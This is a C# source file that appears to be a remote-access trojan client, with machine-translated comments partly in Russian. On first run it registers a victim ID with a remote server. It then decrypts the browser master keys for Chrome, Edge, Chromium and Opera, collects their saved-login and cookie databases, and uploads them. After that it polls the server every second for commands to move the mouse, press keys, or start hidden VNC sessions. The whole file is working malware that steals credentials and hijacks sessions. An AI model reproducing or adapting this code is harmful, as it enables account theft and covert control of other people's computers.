using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Threading.Tasks;


class Program
{
    static async Task Main(string[] args)
    {
        string filePath = "unique_id.txt";

        //Loading or creating a unique identifier
        if (File.Exists(filePath))
        {
            Variables.uniqueId = File.ReadAllText(filePath).Trim(); // Loading of unique identifier from file
        }
        else
        {
            Variables.uniqueId = Guid.NewGuid().ToString(); // Generation of a new unique identifier
            await WriteToFileAsync(filePath, Variables.uniqueId); // Enter unique identifier in file
            await SendPostRequestAsync($"{Variables.ip}/receive_id", Variables.uniqueId); // Declaring unique identifier to server
            await BrowserGrabber(); // Assemble files of the browser and digitiser keys
        }

        // Time stamp for periodic query on the server
        System.Threading.Timer timer = new System.Threading.Timer(TimerCallback, null, 1000, 1000);

        // Output of unique identifier in console
        Console.WriteLine($"Уникальный ID: {Variables.uniqueId}");

        // Press Enter to load the program keys
        Console.ReadLine();
    }

    // Asychronous output method for timer
    static async void TimerCallback(object state)
    {
        await SendPostRequestAsync($"{Variables.ip}/requests/{Variables.uniqueId}", Variables.uniqueId); // Отправка запроса на сервер
    }

    // Asynchronous method for retrieving POST-search on the server
    public static async Task SendPostRequestAsync(string url, string data)
    {
        try
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url); // Request creation
			request.Method = "POST"; // Installation method POST
            request.ContentType = "application/json"; // Content type installation

            // Enter data in the query body in JSON format
            using (StreamWriter streamWriter = new StreamWriter(await request.GetRequestStreamAsync()))
            {
                string json = JsonConvert.SerializeObject(new { Client = data });
                await streamWriter.WriteAsync(json);
            }

            // Obtaining a response from the server
            using (HttpWebResponse response = (HttpWebResponse)await request.GetResponseAsync())
            {
                // Reading response
                using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
                {
                    string result = await streamReader.ReadToEndAsync(); // Reading data from the pot
                    Console.WriteLine("Reply from server: " + result); // Server output in console

                    // Server response processing
                    dynamic responseObject = JsonConvert.DeserializeObject(result);

                    // Asynchronous output of mouse emulation team
                    if (responseObject.command != null && responseObject.command.ToString().StartsWith("move_mouse"))
                    {
                        await Mouse.MoveMouse(responseObject.command.ToString());
                    }

                    // Asynchronous output of the keyboard processor command
                    if (responseObject.command != null && responseObject.command.ToString().StartsWith("press_key"))
                    {
                        await Keyboard.PressKey(responseObject.command.ToString());
                    }

                    //Asynchronous output of the HVNC command post processor
                    if (responseObject.command != null && responseObject.command == "start_hvnc")
                    {
                        await HVNC.StartHVNC(responseObject.command.ToString());
                    }

                    // Asynchrophonic output of the HVNC deactivation team
                    if (responseObject.command != null && responseObject.command == "stop_hvnc")
                    {
                        await HVNC.StopHVNC(responseObject.command.ToString());
                    }

                    // Asynchroon output processor command for Chromecast
                    if (responseObject.command != null && responseObject.command == "start_hvnc_chrome")
                    {
                        await ChromeComands.StartChrome(responseObject.command.ToString());
                    }

                    // Synchro output of the Explorer Command Processor
                    if (responseObject.command != null && responseObject.command == "start_hvnc_explorer")
                    {
                        await ExplorerCommands.StartExplorer(responseObject.command.ToString());
                    }
                }
            }
        }
        catch (WebException e)
        {
            // Processing of errors when opening a query on the server
            if (e.Response is HttpWebResponse response)
            {
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    string errorText = reader.ReadToEnd();
                    Console.WriteLine($"Oshibka: {errorText}");
                }
            }
            else
            {
                Console.WriteLine($"No response from the server: {e.Message}");
            }
        }
    }

    // Method for entering data in files
    static async Task WriteToFileAsync(string filePath, string data)
    {
        using (StreamWriter writer = new StreamWriter(filePath))
        {
            await writer.WriteLineAsync(data);
        }
    }

    static async Task BrowserGrabber()
    {
        try
        {
            // Word for storing travel and names of travelers
            Dictionary<string, string> browserPaths = new Dictionary<string, string>
            {
                { "Google Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data") },
                { "Microsoft Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Microsoft\Edge\User Data") },
                { "Chromium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Chromium\User Data") },
                { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Opera Software\Opera Stable") }
            };


            // Creating a basic JSON object for storing data across all browsers
            JObject mainJson = new JObject();

            foreach (var browser in browserPaths)
            {
                string browserName = browser.Key;
                string userDataPath = browser.Value;

                Console.WriteLine($"Используется браузер: {browserName}");
                Console.WriteLine($"Путь к папке User Data: {userDataPath}");

                // Search file Local State
                string localStatePath = Path.Combine(userDataPath, "Local State");
                if (File.Exists(localStatePath))
                {
                    // Reading the attached file Local State
                    string localStateData = File.ReadAllText(localStatePath);

                    // Converting the content to JSON
                    dynamic json = JObject.Parse(localStateData);

                    // Search for encrypted key
                    string encryptedKeyBase64 = json.os_crypt.encrypted_key;

                    // Decoding keys from Base64
                    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                    // Removal of the first 5 battles
                    byte[] trimmedKey = encryptedKey.Skip(5).ToArray();

                    // Key coding using DPAPI
                    byte[] decryptedKey = ProtectedData.Unprotect(trimmedKey, null, DataProtectionScope.CurrentUser);
                    string decryptedKeyBase64 = Convert.ToBase64String(decryptedKey);
                    Console.WriteLine($"Rendered key (Base64): {decryptedKeyBase64}");

                    // Creating a JSON object for a browser
                    JObject browserJson = new JObject
                    {
                        ["key"] = decryptedKeyBase64
                    };

                    // Recurring file search Login Data and Cookies
                    var loginDataFiles = Directory.GetFiles(userDataPath, "Login Data", SearchOption.AllDirectories);
                    var cookiesFiles = Directory.GetFiles(userDataPath, "Cookies", SearchOption.AllDirectories);

                    // Adding the contained file Login Data in JSON
                    JArray loginDataArray = new JArray();
                    foreach (var loginDataPath in loginDataFiles)
                    {
                        try
                        {
                            if (File.Exists(loginDataPath))
                            {
                                byte[] loginDataBytes = File.ReadAllBytes(loginDataPath);
                                string loginDataBase64 = Convert.ToBase64String(loginDataBytes);
                                loginDataArray.Add(loginDataBase64);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Could not remove access to the file Login Data: {loginDataPath}. Oshibka: {ex.Message}");
                            continue;
                        }
                    }
                    browserJson["login_data"] = loginDataArray;

                    // Adding the containing file Cookies in JSON
                    JArray cookiesArray = new JArray();
                    foreach (var cookiesPath in cookiesFiles)
                    {
                        try
                        {
                            if (File.Exists(cookiesPath))
                            {
                                byte[] cookiesDataBytes = File.ReadAllBytes(cookiesPath);
                                string cookiesDataBase64 = Convert.ToBase64String(cookiesDataBytes);
                                cookiesArray.Add(cookiesDataBase64);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Could not remove access to the file Cookies: {cookiesPath}. Oshibka: {ex.Message}");
                            continue;
                        }
                    }
                    browserJson["cookies"] = cookiesArray;

                    // Adding browser data to the main JSON object
                    mainJson[browserName] = browserJson;
                }
                else
                {
                    Console.WriteLine($"File Local State for browser {browserName} is not available");
                }
            }

            // Deploying a basic JSON object to a server
            await SendPostRequestAsync($"{Variables.ip}/browser_log/{Variables.uniqueId}", mainJson.ToString());
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Oshibka: {ex.Message}");
        }
    }
}

